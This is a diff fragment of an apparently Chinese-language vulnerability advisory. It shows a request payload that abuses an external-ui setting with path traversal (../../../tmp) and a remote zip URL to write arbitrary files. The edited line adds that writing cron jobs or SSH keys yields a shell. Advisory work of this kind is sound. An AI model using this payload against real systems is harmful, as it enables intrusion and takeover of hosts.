@@ -18,7 +18,7 @@ Content-Type: text/plain;charset=UTF-8
 
 {"payload":"\n  external-ui: gY1bN0iF0kG2eN4z\n  external-ui-url: http://www.demo.com/demo.zip\n                external-ui-name: demo","path":""}
 ```
-external-ui-url位置的远程文件http://www.demo.com/demo.zip可路径穿越，通过external-ui: ../../../tmp的方式，突破目录限制，实现任意文件写入。
+external-ui-url位置的远程文件可以是任意恶意文件，可路径穿越，通过external-ui: ../../../tmp的方式，突破目录限制，实现任意文件写入。（可实现写cron、写ssh key等多种方式getshell）
 
 
 *【安全修复建议】
